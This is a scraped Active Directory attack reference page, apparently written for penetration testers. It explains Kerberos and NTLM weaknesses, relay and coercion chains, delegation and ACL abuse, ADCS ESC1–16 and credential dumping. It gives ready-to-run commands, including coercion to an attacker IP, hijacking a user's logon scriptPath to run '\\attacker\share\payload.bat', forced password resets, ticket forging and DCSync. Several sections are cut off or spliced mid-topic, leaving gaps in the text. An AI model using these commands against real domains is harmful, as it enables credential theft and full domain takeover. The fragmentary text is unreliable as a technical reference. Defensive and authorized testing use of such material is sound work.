---
title: "ad attack architecture"
source_url: https://kypvas.github.io/ad_attack_architecture/
fetched_at: 2026-09-20T07:24:55Z
license: unspecified
category: ad
---

Before attacking AD, understand what it is. These are the building blocks every technique relies on.

AD Structure Overview

FOREST (security boundary)
└── DOMAIN (e.g., corp.local) // NOT a security boundary
├── Domain Controller (DC) Hosts AD database (NTDS.dit), DNS, Kerberos KDC, LDAP
├── Organizational Units (OUs) Containers for users, computers, groups — GPOs link to OUs
├── Users Each has: SID, NT hash, group memberships, attributes
├── Computers Machine accounts (COMPUTER$) — also have passwords/hashes
├── Groups Security groups control access; nesting creates complex paths
├── Group Policy Objects (GPOs) Push config to all machines in linked OUs
├── Service Accounts Accounts running services — often over-privileged with SPNs
└── CHILD DOMAIN (e.g., eu.corp.local) // Parent-child trust is automatic & transitive
└── Child → Parent escalation is trivial (ExtraSID / raiseChild)

BASICS

Key AD Objects

What you enumerate and attack

SID (Security Identifier): Unique ID for every object — e.g., S-1-5-21-...-500 (built-in admin). RID 512 = Domain Admins, 519 = Enterprise Admins

SPN (Service Principal Name): Links a service to an account — SPNs on user accounts = Kerberoastable

UPN (User Principal Name): user@domain.local format for authentication

DN (Distinguished Name): Full LDAP path — CN=Admin,OU=Users,DC=corp,DC=local

SAM Account Name: Legacy DOMAIN\username format

DACL: Access Control List on every object — defines who can do what to it

BASICS

Trust Types

How domains and forests connect

Parent-Child: Automatic, bidirectional, transitive — child can escalate to parent via ExtraSID

Tree-Root: Connects trees within a forest — transitive, bidirectional

Forest (External): Between forests — can be one-way or two-way. SID filtering applies

Shortcut: Optimizes authentication between distant domains in same forest

Realm: Trust with non-Windows Kerberos (e.g., Linux MIT Kerberos)

Key concept: Domain ≠ security boundary. Only the forest is a security boundary.

BASICS

Critical Groups

Groups that grant privileged access

Domain Admins (RID 512): Full control of the domain — the primary target

Enterprise Admins (RID 519): Full control of the entire forest (exists only in root domain)

Schema Admins (RID 518): Can modify the AD schema (rare but devastating)

Account Operators: Can create/modify most users and groups (often overlooked)

Backup Operators: Can back up/restore any file including NTDS.dit — DCSync equivalent

Server Operators: Logon to DCs, manage services — can escalate to DA

DNSAdmins: Can load arbitrary DLL into DNS service on DC — code execution as SYSTEM

Protected Users: Defensive group — disables NTLM, forces Kerberos AES, no delegation

BASICS

Authentication Protocols

How users prove their identity

Kerberos (port 88): Default for domain auth — ticket-based, uses KDC on DC

NTLM (embedded): Fallback when Kerberos fails — challenge-response, no mutual auth

LDAP (389/636): Directory queries — authentication via simple bind or SASL

SMB (445): File sharing — carries NTLM or Kerberos auth, signing is critical

Understanding Kerberos is essential — every ticket-based attack exploits a specific step in this protocol.

Kerberos Authentication Flow

Step 1: AS-REQ (Authentication Service Request)
User → KDC: "I am user X, I want a TGT"
├── Encrypted with user's NT hash (password-derived)
├── Contains: username, timestamp, requested lifetime
└── Pre-authentication proves user knows password// If DONT_REQ_PREAUTH is set → AS-REP Roasting (no password needed to request)Step 2: AS-REP (Authentication Service Reply)
KDC → User: "Here is your TGT"
├── TGT encrypted with krbtgt hash (only KDC can decrypt)
├── Session key encrypted with user's NT hash
└── TGT contains: user identity, PAC, timestamps, session key
// Golden Ticket = forged TGT using stolen krbtgt hashStep 3: TGS-REQ (Ticket Granting Service Request)
User → KDC: "I want to access service Y" (presents TGT)
├── Includes TGT + authenticator (encrypted with session key)
├── Specifies target SPN (e.g., CIFS/fileserver.domain.local)
└── KDC does NOT verify user can access service — just issues TGS
// Kerberoasting: any user can request TGS for any SPN, crack offlineStep 4: TGS-REP (Ticket Granting Service Reply)
KDC → User: "Here is your Service Ticket (TGS)"
├── TGS encrypted with service account's NT hash
├── Contains PAC with user's group memberships
└── New session key for user ↔ service communication
// Silver Ticket = forged TGS using stolen service hashStep 5: AP-REQ (Application Request)
User → Service: "Here is my ticket, let me in"
├── Service decrypts TGS with its own hash
├── Validates PAC (optional — many services skip this)
└── If PAC validation is skipped, Silver Tickets go undetected

KERBEROS

TGT (Ticket Granting Ticket)

The "master key" to request service tickets

Encrypted with krbtgt account hash — only the KDC can read it

Contains user identity, PAC (Privilege Attribute Certificate), timestamps

Default lifetime: 10 hours, renewable for 7 days

Golden Ticket: forged TGT with arbitrary PAC — requires krbtgt hash

Diamond Ticket: modifies a legitimate TGT's PAC — harder to detect

Stored in memory (LSASS) or as .kirbi/.ccache files

KERBEROS

TGS (Service Ticket)

Grants access to a specific service

Encrypted with the target service account's NT hash

Any authenticated user can request a TGS for any SPN — the KDC does not check authorization

Silver Ticket: forged TGS — never touches KDC, hard to detect

SPN swap: the service name in the ticket is not encrypted — can be changed post-issuance

KERBEROS

PAC (Privilege Attribute Certificate)

Embedded in every ticket — defines who you are

Contains: user SID, group SIDs, logon info, resource group memberships

Signed by krbtgt (server checksum) and KDC (KDC checksum)

Most services do not validate PAC signatures with the KDC

MS14-068 (CVE-2014-6324): forged PAC → any user becomes Domain Admin

ExtraSID attack: inject Enterprise Admin SID (-519) into PAC for forest takeover

KERBEROS

S4U Extensions

Service-for-User — the backbone of delegation attacks

S4U2Self: Service requests a ticket to itself on behalf of a user (protocol transition)

S4U2Proxy: Service uses the user's ticket to access another service on their behalf

Constrained Delegation: S4U2Self → S4U2Proxy chain to impersonate any user to allowed SPNs

RBCD: S4U2Self (forwardable) → S4U2Proxy to target — write-based, no DC config needed

Key insight: S4U2Self only returns forwardable ticket if TRUSTED_TO_AUTH_FOR_DELEGATION is set

RBCD trick: RBCD targets accept non-forwardable tickets from S4U2Self — bypasses the check

// NTLM Authentication Basics

NTLM is the fallback protocol when Kerberos fails — and its weaknesses enable relay, capture, and pass-the-hash attacks.

NTLM Challenge-Response Flow

Step 1: NEGOTIATEClient → Server: "I want to authenticate using NTLM"
├── Flags: NTLMSSP_NEGOTIATE_NTLM, NTLMSSP_NEGOTIATE_SEAL, etc.
└── Indicates supported features (NTLMv1 vs NTLMv2, signing, etc.)
Step 2: CHALLENGEServer → Client: "Prove your identity with this challenge"
├── Server sends 8-byte random challenge (nonce)
├── This challenge can be relayed to another server
└── Challenge is not tied to the target server identity
Step 3: AUTHENTICATEClient → Server: "Here is my response"
├── Client computes HMAC-MD5 of challenge using NT hash
├── NTLMv1: DES-based, crackable, susceptible to rainbow tables
├── NTLMv2: HMAC-MD5 with server+client challenge + timestamp
└── Response can be captured (Responder) and cracked offlineWhy NTLM is dangerous:
├── No mutual authentication — client doesn't verify server identity
├── Challenge not bound to destination — enables relay attacks
├── Pass-the-Hash works because NT hash IS the credential (no salt)
└── Forced auth via UNC paths, Office docs, profile paths, coercion RPC

NTLM

NTLMv1 vs NTLMv2

Version determines crackability and relay potential

NTLMv1: DES-based, 8-byte challenge — trivially crackable, convertible to NT hash via crack.sh

NTLMv1 + ESS: Extended Session Security adds client challenge but still weak

NTLMv2: HMAC-MD5 with timestamp + client challenge + target info — harder to crack but still offline-crackable

Net-NTLMv2: what you capture with Responder — hashcat mode 5600

Check policy: LMCompatibilityLevel registry value controls version (0-5)

Downgrade: if NTLMv1 allowed, force downgrade for easier cracking

NTLMRELAY

NTLM Relay Attack Paths

The most impactful NTLM weakness

Relay captured NTLM auth to a different target:

SMB → SMB: Requires signing disabled on target (default on workstations)

SMB → LDAP(S): Create machine accounts, modify ACLs, set RBCD

SMB → HTTP: ADCS web enrollment (ESC8), Exchange

HTTP → LDAP: Works if Extended Protection for Auth is off

Tools: ntlmrelayx + Responder (--disable-http-server if relaying)

EPA / Channel Binding: mitigates relay to LDAPS / HTTPS

Force authentication, then relay to valuable targets

Chain coercion with relay for maximum impact:

PetitPotam + ADCS: Coerce DC → relay to CA web enrollment → DC cert → DCSync

PrinterBug + Unconstrained: Coerce DC to unconstrained host → capture TGT

DFSCoerce + RBCD: Coerce target → relay to LDAP → set RBCD → impersonate

WebDAV + Coercion: HTTP-based coercion from internal host → relay to LDAP (no signing check)

Key requirement: WebDAV (WebClient service) enables HTTP-based coercion on workstations

// Hash Types Reference

Know your hashes — each type has different cracking methods, hashcat modes, and exploitation potential.

AD Hash Types & Hashcat Modes

HASH TYPE HASHCAT EXAMPLE / FORMAT WHERE FOUND
─────────────────────────────────────────────────────────────────────────────────────────────────────
NT Hash (NTLM)1000 aad3b435...::32ed87bdb5fdc5e9cba... SAM, NTDS.dit, LSASS, DCSyncLM Hash3000 aad3b435b51404eeaad3b435b51404ee Legacy SAM (disabled by default)Net-NTLMv15500 user:::challenge:response Responder capture, coercionNet-NTLMv25600 user::domain:challenge:hmac:blob Responder capture, coercionAS-REP (Kerberos)18200 $krb5asrep$23$user@domain:hash AS-REP Roasting (no preauth)TGS-REP (Kerberoast)13100 $krb5tgs$23$*user$domain$spn*$hash Kerberoasting (any auth user)TGS-REP (AES)19700 $krb5tgs$17/18$user$domain$hash AES Kerberoasting (slower crack)DCC2 (mscachev2)2100 $DCC2$10240#user#hash Cached domain creds (offline)MsCacheV11100 hash:username Old cached creds (rare)CRACKING TIPS
├── NT hashes: No salt → rainbow tables work, instant lookup via CrackStation/NTLM.pw
├── Net-NTLMv2: Offline crackable but salted with challenge — wordlist + rules
├── AS-REP / TGS: RC4 = fast (mode 18200/13100), AES = slow (mode 19700)
├── DCC2: Very slow to crack (PBKDF2, 10240 iterations) — targeted only
└── Pass-the-Hash: NT hash is the credential itself — no need to crack

// Initial Access

Before exploiting AD, you need a foothold. These are the most common ways to obtain initial domain credentials or network position.

INITIAL

Network Position (No Creds)

What you can do without any credentials

LLMNR/NBT-NS Poisoning: Responder captures Net-NTLMv2 hashes from broadcast name resolution

IPv6 DNS Takeover: mitm6 → WPAD proxy → relay NTLM to LDAP

ARP Spoofing: MITM position on local subnet

Null session: Test for anonymous LDAP/SMB binds — netexec smb target -u '' -p ''

Contains: NT hashes, Kerberos keys (AES256/128), password history, supplemental creds

Offline parse: DitExplorer (TrustedSec) — browser-style viewer for NTDS.dit + SYSTEM hives; fast post-DCSync / backup-image analysis without full impacket parsing

CRED DUMP

DCC2 (Domain Cached Credentials)

Cached logon creds for offline authentication

Windows caches the last 10 domain logon credentials locally so users can log in when DC is unreachable.

Location: HKLM\SECURITY\Cache registry hive (NL$1 through NL$10)

Format: MSCACHEV2 / DCC2 — PBKDF2 with 10240 iterations

Extract: secretsdump.py or Mimikatz lsadump::cache

Hashcat: Mode 2100 — extremely slow to crack

Cannot Pass-the-Hash: DCC2 hashes are not NT hashes — must be cracked

Useful when: Laptop disconnected from network, only cached creds available

CRED DUMP

Cached Credentials & All-in-One Dumping

Grab everything at once — browsers, Wi-Fi, mail clients, databases, sysadmin tools

Beyond LSASS and SAM, credentials are cached in dozens of applications across the system. All-in-one tools extract them in seconds.

LaZagne: All-in-one credential recovery — browsers, Wi-Fi, mail (Outlook, Thunderbird), databases, sysadmin tools (FileZilla, PuTTY, WinSCP, OpenSSH), Windows Credential Manager

Coverage: 40+ applications supported across Windows and Linux — single binary, no dependencies

Wi-Fi passwords: netsh wlan show profile name=X key=clear or DPAPI-decrypt from registry

RDP saved creds: Stored as DPAPI blobs in %LOCALAPPDATA%\Microsoft\Credentials\

PuTTY / WinSCP / FileZilla: Cleartext or weakly encrypted passwords in registry and XML configs

Mail clients: Outlook profiles in registry, Thunderbird logins.json + key4.db

Windows Credential Manager: cmdkey /list to enumerate, SharpDPAPI to decrypt programmatically

goLazagne: Go implementation — cross-platform, compiles to single static binary

CRED DUMP

RemoteMonologue

DCOM-based credential dumping via Internal-Monologue

Leverages the Internal-Monologue technique over DCOM to extract NTLMv1/v2 hashes from remote machines

No LSASS interaction — does not touch LSASS memory, avoiding EDR detections for process access

Triggers local NTLM authentication on the remote host via DCOM and captures the resulting hash

Extracts NTLMv1 or NTLMv2 hashes depending on target configuration

NTLMv1 hashes can be converted to NT hashes via crack.sh or rainbow tables

OPSEC advantage: Avoids Sysmon Event 10 (LSASS access) and most credential dumping signatures

dfscoerce.py attacker-ip target-ip -u user -p pass

Works on servers running DFS Namespace service

Combo: Similar to PetitPotam — relay to LDAP for RBCD or to ADCS

COERCION

ShadowCoerce (MS-FSRVP)

File Server VSS Agent Service

Abuses File Server VSS Agent (MS-FSRVP) — used for remote VSS snapshots

Requires authentication

Only works on servers with File Server VSS Agent Service running

shadowcoerce.py attacker-ip target-ip -u user -p pass

Less common than PetitPotam/PrinterBug but useful as alternative

COERCION

WebDAV + Coercion

HTTP-based coercion for NTLM relay to LDAP

WebClient service converts SMB coercion to HTTP authentication

Why it matters: HTTP auth has no signing → can relay to LDAP/LDAPS

SMB → LDAP relay blocked by LDAP signing, but HTTP → LDAP is not

Start WebClient: Search indexer trigger or searchconnector-ms file

Chain: Trigger coercion (PetitPotam) → WebClient redirects to HTTP → relay to LDAP → RBCD

Scope: WebClient typically only on workstations, not servers

COERCION

Kerberos Relay via CNAME

DNS CNAME abuse for cross-service Kerberos relay

Abuses DNS CNAME records to redirect Kerberos authentication to attacker-controlled services

CNAME records create an alias — Kerberos follows the alias, authenticating to the canonical name's SPN

Enables cross-service relay by redirecting authentication intended for one service to another

Documented by cymulate.com — demonstrates practical exploitation in enterprise environments

Requirements: Ability to create or modify DNS CNAME records (default: any authenticated user for ADIDNS)

Mitigation: Restrict ADIDNS record creation, monitor for unexpected CNAME record changes

COERCION

Reflective Kerberos Relay

Self-relay Kerberos auth back to originating service

Self-relay Kerberos authentication back to the originating service on the same machine

Enables privilege escalation without a second machine — no external relay target needed

Documented by redteam-pentesting.de — demonstrates single-host Kerberos relay attacks

Triggers local service authentication and relays the resulting Kerberos ticket back to the same host

Impact: Local privilege escalation via Kerberos — alternative to NTLM-based relay attacks (e.g., KrbRelayUp)

Mitigation: Enable LDAP signing and channel binding, restrict service account permissions

// DPAPI Secrets Deep Dive

Windows Data Protection API protects browser passwords, Wi-Fi keys, RDP credentials, and more. Understanding the key hierarchy is essential for extraction.

DPAPI Key Hierarchy

DPAPI KEY HIERARCHYDomain Backup Key (stored on DC, RSA key pair)
└── Can decrypt ANY domain user's master keys
// Extract: secretsdump.py -target-ip DC | grep "DPAPI"// This is the "god key" for DPAPI in the domainUser Master Key (per-user, rotates every 90 days)
├── Location: %APPDATA%\Microsoft\Protect\{SID}\{GUID}
├── Protected by: user password hash (domain) or local password
├── Also protected by: Domain Backup Key (domain-joined machines)
└── Used to derive blob-specific keys for each secret
DPAPI Blob (individual encrypted secret)
├── Each secret (password, key, cert) wrapped in a DPAPI blob
├── Blob references which Master Key GUID was used
└── Decrypted by deriving key from Master Key + entropy
WHAT DPAPI PROTECTS
├── Chrome/Edge passwords Login Data SQLite → DPAPI blob per credential
├── Chrome/Edge cookies Session cookies → account takeover
├── Windows Credential Manager Saved RDP, SMB, web credentials
├── Wi-Fi profiles WPA2 PSKs stored via DPAPI
├── Certificate private keys User certificate stores
├── Scheduled task creds Run-as credentials for tasks
└── Azure / Office tokens Cached OAuth tokens

GPO version numbers: Each edit increments version — compare against known-good baseline

SYSVOL monitoring: File integrity monitoring on \\domain\SYSVOL\domain\Policies

Cleanup: Always restore original GPO state after testing — GPOs affect production systems

Tip: Use gpresult /r on target to verify which GPOs are actually applied

// Delegation Attacks Deep Dive

Three types of Kerberos delegation and their exploitation paths. Beginners often miss how RBCD + S4U chains lead to NT hashes.

DELEGATION

Unconstrained Delegation

unconstraineddelegation: true • DCs have this by default

Any service with unconstrained delegation caches the TGT of every user that authenticates to it. Combine with coercion to steal DC TGTs.

Find: BloodHound MATCH (c {unconstraineddelegation:true}) RETURN c

Coerce: Coercer / PetitPotam to force DC auth to unconstrained host

Extract: Rubeus dump /user:DC$ /service:krbtgt

Convert: ticketConverter.py kirbi → ccache

DCSync: secretsdump.py -k -no-pass using stolen DC TGT

Key insight: Works child→parent by coercing parent DC to child unconstrained host

Why does this work? When a user authenticates to a service with unconstrained delegation, the KDC includes the user's full TGT inside the service ticket. The service caches this TGT in memory. By coercing a DC to authenticate to such a host, the DC's own TGT gets cached — and a DC's TGT can be used for DCSync.

SPN swap: SPN is not encrypted — use -altservice to change target service

Without protocol transition: Requires RBCD self-trick to get forwardable TGS first

Why does this work? The msDS-AllowedToDelegateTo attribute tells the KDC which SPNs this account may request tickets for on behalf of other users. The SPN in the resulting ticket is not encrypted, so you can swap it to target a different service (e.g., change HTTP/ to CIFS/) after issuance.

DELEGATIONPRIVESC

RBCD (Resource-Based Constrained Delegation)

msDS-AllowedToActOnBehalfOfOtherIdentity

The most versatile delegation attack. Write a controlled computer to target's RBCD attribute, then impersonate admin.

Prereq: GenericWrite / GenericAll / WriteDACL on target computer object

Step 4: Use ticket → secretsdump / smbexec / wmiexec

Chains with constrained deleg: RBCD from new machine → constrained host for forwardable TGS

Why does this work? Unlike constrained delegation (configured on the DC), RBCD is configured on the target itself via msDS-AllowedToActOnBehalfOfOtherIdentity. Anyone who can write this attribute can authorize their own machine to impersonate users to the target. The KDC trusts this attribute because it's a legitimate AD feature for resource owners.

// ACL Abuse Paths

Access Control Entries are the building blocks of AD permissions. Each ACE type has specific exploitation techniques.

ACL

ForceChangePassword

User-Force-Change-Password extended right

net rpc password target -U attacker -S DC

Warning: Blocks the user — never use without authorization

Why does this work? The User-Force-Change-Password extended right lets you reset another user's password without knowing their current password. AD treats this as a legitimate admin function. Once you change their password, you authenticate as them.

ACL

GenericWrite

Write any non-protected attribute on the target

Three exploitation paths:

Shadow Creds: Write msDS-KeyCredentialLink → certipy shadow auto → NT hash

Targeted Kerberoasting: Set SPN → TGS → crack — targetedKerberoast.py

Profile Path: Set profilePath to attacker → Responder capture NTLMv2

Why does this work? GenericWrite lets you modify non-protected attributes. Shadow Credentials works because Windows Hello for Business uses the msDS-KeyCredentialLink attribute for passwordless auth — writing your own key pair makes the KDC issue you a TGT. Setting an SPN makes the account Kerberoastable because any user can request a TGS for any SPN.

ACL

WriteDACL

Modify the DACL itself — grant yourself any permission

Why does this work? The DACL (Discretionary Access Control List) defines who can do what on an AD object. WriteDACL lets you edit these permissions — so you can grant yourself FullControl or DCSync rights. It's like being able to rewrite the lock on someone else's door.

ACL

WriteOwner / GenericAll

Take ownership → WriteDACL | Full control over object

WriteOwner: owneredit.py change owner → then WriteDACL → FullControl

GenericAll on user: Change password, set SPN, shadow creds

GenericAll on computer: RBCD, read LAPS, shadow creds on machine

GenericAll on group: AddMember — add yourself

GenericAll on domain: DCSync (DS-Replication-Get-Changes-All)

ACLPERSIST

AdminSDHolder

CN=AdminSDHolder,CN=System • resets protected group ACLs every 60min

Protected groups (Domain Admins, Enterprise Admins, etc.) have ACLs reset every hour by SDProp

ACLs set directly on protected groups/users get wiped by SDProp

Persistence: Modify AdminSDHolder ACL → propagates to all protected objects

ACL

GenericWrite → scriptPath Hijack

Write logon script path → code execution on next logon

GenericWrite on a user allows setting scriptPath attribute

Set scriptPath to attacker-controlled SMB share → script runs at next logon

bloodyAD set object targetUser scriptPath -v '\\attacker\share\payload.bat'

OPSEC: User sees the script execute — keep it fast and silent

Script executes in user's context on their workstation

ACL

GenericWrite → profilePath Hijack

Redirect roaming profile to attacker → capture NTLMv2 hash

Set profilePath to attacker-controlled UNC path

On next logon, Windows authenticates via NTLM to load the profile

Responder captures NTLMv2 hash — crack or relay

Passive: Just wait for victim to logon — no coercion tool needed

Can also set homeDirectory for similar effect

ACL

GenericAll on Computer → Silver Ticket

Full control on machine account → reset password → forge TGS

GenericAll on a computer object allows resetting its password

Reset machine$ password → compute NT hash → forge Silver Ticket for any service

net rpc password 'TARGET$' -U attacker -S DC

ticketer.py -nthash HASH -domain-sid SID -domain dom -spn cifs/target admin

Warning: Machine password change may break AD trust — re-join may be needed

ACL

WriteDACL on OU → Inheritance (OUned)

Modify OU permissions → inherit FullControl on all child objects

WriteDACL on an OU lets you set ACEs that inherit to all child objects

Grant yourself GenericAll with inheritance flag → control every user/computer in that OU

Template allows user-supplied Subject Alternative Name (SAN)

Request cert with -upn administrator@domain — CA blindly issues it

certipy req -ca CA -template VulnTemplate -upn administrator@domain

certipy auth -pfx admin.pfx → NT hash via PKINIT

Conditions: ENROLLEE_SUPPLIES_SUBJECT flag + Client Auth EKU + low-priv enrollment rights

Mitigation: Remove ENROLLEE_SUPPLIES_SUBJECT, require CA manager approval

Why does this work? The flag lets the requester specify any SAN. The CA trusts the template config and issues a cert with the attacker-supplied identity. PKINIT accepts this cert as valid authentication for that user.

Get cert as DC → PKINIT → DCSync → all domain hashes

Coercion: PetitPotam, PrinterBug, DFSCoerce — any method that forces DC auth to attacker

Mitigation: Enable EPA on enrollment endpoints, use HTTPS, disable HTTP enrollment

Why does this work? HTTP has no signing mechanism. The CA accepts relayed NTLM auth as legitimate and issues a certificate to whoever authenticated — including a DC whose auth was relayed.

ADCS

ESC9 — No Security Extension (Template)

CT_FLAG_NO_SECURITY_EXTENSION on template

Template has CT_FLAG_NO_SECURITY_EXTENSION flag — cert does not embed the requester's SID

Without the security extension, certificate-to-user mapping relies on UPN/DNS name only

Attack: If you can modify another user's UPN (GenericWrite) → change UPN to target → request cert → restore UPN → authenticate as target

The cert maps to whoever has that UPN at authentication time

Requires: GenericWrite on target user + template without security extension

Mitigation: Ensure templates include the security extension (szOID_NTDS_CA_SECURITY_EXT)

ADCS

ESC10 — Weak Certificate Mapping

Registry controls how certificates map to accounts

Two registry values control cert mapping strength:

StrongCertificateBindingEnforcement = 0 on DC — weak mapping accepted

CertificateMappingMethods contains 0x4 (UPN mapping) — allows impersonation via UPN

Attack (Case 1): GenericWrite on user → change UPN → request cert → auth as that user

Attack (Case 2): GenericWrite on computer → change dNSHostName → request machine cert → auth as that machine

Mitigation: Set StrongCertificateBindingEnforcement = 2, remove weak mapping methods

ADCS

ESC11 — NTLM Relay to RPC Enrollment

Like ESC8 but via RPC (ICPR) instead of HTTP

CA exposes enrollment via RPC (MS-ICPR) in addition to HTTP

If IF_ENFORCEENCRYPTICERTREQUEST = 0 — RPC enrollment accepts unencrypted NTLM

Coerce + relay to RPC enrollment endpoint — same result as ESC8

certipy relay -ca CA -template DomainController

Difference from ESC8: Targets RPC interface, not HTTP — relevant when HTTP enrollment is disabled

Mitigation: Set IF_ENFORCEENCRYPTICERTREQUEST = 1, require encryption for RPC enrollment

ADCS

ESC13 — Issuance Policy → Group

OID linked to AD group via issuance policy

An issuance policy OID can be linked to an AD group via msDS-OIDToGroupLink

When a cert with that policy is used for auth, the user is added to the linked group for that session

If the linked group is privileged (e.g., Domain Admins) → instant privilege escalation

Requirements: Enrollment rights on template with the linked issuance policy

certipy req -ca CA -template PolicyTemplate → auth with cert → gain group membership

Mitigation: Audit msDS-OIDToGroupLink attributes, restrict enrollment on policy-linked templates

ADCS

ESC14 — Explicit Certificate Mapping

altSecurityIdentities misconfiguration

Certificate-to-account mapping stored in altSecurityIdentities attribute on user objects

If attacker can modify altSecurityIdentities on target → map their own cert to that account

Also abusable via weak mapping formats (Issuer+SerialNumber instead of SKI+SHA1)

Attack: Request any cert → write its mapping to target's altSecurityIdentities → auth as target

Requires: Write access on target's altSecurityIdentities attribute

Mitigation: Restrict write access on altSecurityIdentities, use strong mapping formats

ADCSNEW

ESC15 (EKUwu) — Schema v1 App Policy

CVE-2024-49019 • Oct 2024 by TrustedSec

Exploits Schema Version 1 templates where AD CS fails to validate Application Policy OIDs.

Schema v1 templates (e.g. WebServer) don't validate Application Policy field

Inject --application-policies "1.3.6.1.5.5.7.3.2" (Client Auth) into request

Mitigation: Duplicate v1 templates as v2, remove unused v1 templates

Why does this work? Schema v1 templates predate Application Policy validation. AD CS does not validate the OID field — attackers inject Client Auth EKU into templates that only allow Server Auth. The injected policy overrides the template's intended EKU.

ADCS

ESC16 — No Security Extension (CA-wide)

Like ESC9 but enforced at the CA level

CA is configured to not include the security extension in issued certificates (CA-wide setting)

Same impact as ESC9 but affects all templates on that CA, not just one

Certificates lack SID embedding → rely on UPN/DNS name mapping only

Attack: Same as ESC9 — modify target UPN via GenericWrite → request cert → restore → auth

Broader scope: Every template on this CA is vulnerable, not just flagged ones

Mitigation: Enable security extension at CA level, ensure SID is embedded in all certs

ADCSCRITICAL

Certighost (CVE-2026-54121)

Post-ESC AD CS flaw • any domain user forges a DC certificate → DCSync • CVSS 8.8

Flaw: improper authorization in AD CS — the CA’s “chase” lookup follows external routing instructions (the cdc parameter) when it cannot resolve an object locally — a low-privileged user can manipulate machine-account attributes so the CA issues a certificate that impersonates a domain controller

Why it matters: any single authenticated domain user is enough — no template flags, EKUs, or ESC1–ESC16 issues needed — “ESC-hardened” CAs are still fully breakable

Chain: forge a DC certificate → PKINIT as the DC → collect the DC’s Kerberos cache → DCSync / NT hash extraction → full domain takeover

Public PoC: fully working exploit released July 24, 2026 — aniqfakhrul/CVE-2026-54121 (certighost.py) + technical write-up by H0j3n; detection write-ups followed within days

Affects: Enterprise CAs on Windows Server 2012–2025 (incl. Server Core) and Windows 10 1607/1809 — nearly every internal Microsoft PKI

Detection: certificate requests whose subject does not match the requesting account, machine-account attribute changes just before cert issuance, PKINIT logons with unexpected principals

Defence: apply the July 14, 2026 update to every Enterprise CA server — the fix adds validation of the enrollment path; responsibly reported May 14, 2026

SCCMDecryptor-BOF: BOF to decrypt NAA creds, task sequences, and collection variables from WMI on managed endpoints

ADIDNS

ADIDNS Time Bombs & Poisoning

Any domain user can create DNS records by default

Time Bombs: Pre-register predictable future hostnames → MITM on domain join

Records stored as dnsNode objects — grouped by name, persist indefinitely

Record Injection: dnstool.py add wildcard → catch unresolved names

Combine with Responder / ntlmrelayx for capture and relay

Target pre-created machine accounts without A records

// Key Attributes & Tool Arsenal

Critical AD Attributes for Pentesters

// DelegationuserAccountControlTRUSTED_FOR_DELEGATION// Unconstrained (0x80000)userAccountControlTRUSTED_TO_AUTH_FOR_DELEG// Constrained w/ proto transitionmsDS-AllowedToDelegateToSPN list// Constrained delegation targetsmsDS-AllowedToActOnBehalfOfOtherIdentitybinary SD// RBCD — who can impersonate// Credential & Key MaterialmsDS-KeyCredentialLinkbinary blob// Shadow Credentials (WHfB key)ms-Mcs-AdmPwdcleartext password// LAPS password (legacy)servicePrincipalNameSPN list// Kerberoasting targetuserAccountControlDONT_REQ_PREAUTH// AS-REP roastable (0x400000)// ADCSmsPKI-Certificate-Name-FlagCT_FLAG_ENROLLEE_SUPPLIES_SUBJECT// ESC1 flagmsPKI-Template-Schema-Version1// ESC15 target (v1 templates)altSecurityIdentitiescertificate mapping// Explicit cert-to-user binding// TrusttrustAttributesFOREST_TRANSITIVE// Forest trust flagtrustAttributesTREAT_AS_EXTERNAL// SID history across forestssIDHistoryforeign SID list// Cross-domain privesc via SIDs

Essential Tool Arsenal

ENUMERATION
├── BloodHound + SharpHound / bloodhound-python// AD graph mapping
├── CrackMapExec / netexec// Swiss army knife
├── certipy find// ADCS enum
├── sccmhunter// SCCM/MECM enum
├── ldeep / findDelegation.py// LDAP + delegation enum
├── ShadowHound// PowerShell AD enum (SharpHound alternative, no binary on disk)
├── SilentHound// Stealthy LDAP-based AD enum (minimal query footprint)
├── BOFHound// BloodHound-compatible data collection via BOF LDAP queries
├── Adalanche// AD ACL visualization and attack path exploration
├── RustHound-CE// Rust-based BloodHound collector with custom LDAP filtering
├── Neo4LDAP// LDAP to Neo4j Cypher query translation
├── BloodHoundViewer// BHCE browser extension for query history and saved queries
├── SOAPHound / SoaPy// Stealthy AD enum via AD Web Services (X-Force)
├── regcertipy// ADCS template enum from registry cache (opsec-safe)
└── ldapsearch (hand-tailored filters) // Small-scope LDAP queries — quietest large-scale enumPATH MINING & OFFLINE ANALYSIS
├── AD_Miner// Cypher queries over BloodHound graph → audit report
├── PrivHound// Local privesc paths modelled as BH graph
├── bloodhound-quickwin// Quick useful queries over BH + Neo4j
└── DitExplorer// Offline NTDS.dit viewer (TrustedSec)EXPLOITATION
├── impacket suite // getST, secretsdump, ntlmrelayx, ticketer, raiseChild
├── certipy// ADCS ESC1-16
├── Rubeus// Kerberos abuse (Windows)
├── Coercer / PetitPotam// Auth coercion
├── dacledit.py / owneredit.py// ACL abuse
├── rbcd.py / addcomputer.py// RBCD + machine accounts
├── targetedKerberoast.py// GenericWrite → Kerberoast
├── SharpSCCM / SCCMSecrets.py// SCCM exploitation
├── DonPAPI / dploot// DPAPI secrets
├── pre2k// Pre-Windows 2000 computer account enumeration & exploitation
└── regsecrets.py / dpapidump// Remote registry/DPAPI secrets (Synacktiv “LSA Secrets revisited”)POST-EXPLOITATION & LATERAL MOVEMENT
├── secretsdump.py// DCSync / NTDS dump
├── ticketer.py// Golden / Silver / Trust tickets
├── psexec / wmiexec / smbexec / atexec// Remote exec
├── SCShell// Fileless lateral via service config (port 135 only)
├── Mimikatz// The classic (Windows)
├── LaZagne / goLazagne// All-in-one cached credential dumping
├── incognito / elevate_pid_bof// Token impersonation & process token theft
└── SweetPotato / PrintSpoofer / GodPotato// SeImpersonate → SYSTEM

BloodHound Key Cypher Queries

// Unconstrained delegation (non-DC)MATCH (c1:Computer)-[:MemberOf*1..]->(g:Group) WHERE g.objectid ENDS WITH '-516'
WITH COLLECT(c1.name) AS dcs
MATCH (c2 {unconstraineddelegation:true}) WHERE NOT c2.name IN dcs RETURN c2
// Constrained delegationMATCH p=(u)-[:AllowedToDelegate]->(c) RETURN p
// ACL abuse pathsMATCH p=(u)-[r1]->(n) WHERE r1.isacl=true AND u.admincount=false RETURN p
// Domain trustsMATCH p=(n:Domain)-->(m:Domain) RETURN p
// Shortest path to DAMATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
RETURN p

// Detection / Blue Team Indicators

Key Windows Event IDs and detection strategies for the attacks described above. Essential for purple team exercises.

Critical Event IDs for AD Attack Detection

EVENT ID SOURCE WHAT IT DETECTS ATTACK
────────────────────────────────────────────────────────────────────────────────────────────────────
